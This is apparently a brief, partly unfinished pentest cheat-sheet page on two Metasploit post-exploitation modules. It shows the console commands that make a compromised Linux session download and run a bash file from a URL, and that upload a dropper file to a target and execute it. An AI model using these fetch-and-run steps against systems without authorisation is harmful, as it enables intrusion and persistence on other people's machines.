# Metasploit

Search Tag(s): #post-exploitation #enumeration-and-discovery #metasploit-framework #linux

TODO: Fill this info

Download and execute bash file

```
msf > use post/linux/manage/download_exec

msf post(linux/manage/download_exec) > options 

Module options (post/linux/manage/download_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on
   URL                       yes       Full URL of file to download.


View the full module info with the info, or info -d command.

msf post(linux/manage/download_exec) > set session <session_ID>

msf post(linux/manage/download_exec) > set url <URL>

msf post(linux/manage/download_exec) > run
```

Upload file droppers and execute it with arguments.

```
msf > use post/multi/manage/upload_exec

msf post(multi/manage/upload_exec) > options 

Module options (post/multi/manage/upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ARGS                      no        Command-line arguments to pass to the uploaded file
   LPATH                     yes       Local file path to upload and execute
   RPATH                     no        Remote file path on target (default is basename of LPATH)
   SESSION                   yes       The session to run this module on
   TIMEOUT  60               yes       Timeout for command execution


View the full module info with the info, or info -d command.

msf post(multi/manage/upload_exec) > set lpath /path/to/local/file

msf post(multi/manage/upload_exec) > set args "[arguments]"

msf post(multi/manage/upload_exec) > set rpath /path/to/remote/file

msf post(multi/manage/upload_exec) > set session <session_ID>

msf post(multi/manage/upload_exec) > run
```

---
## References

- [Rapid7: Metasploit Framework Upload Exec Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/upload_exec.md)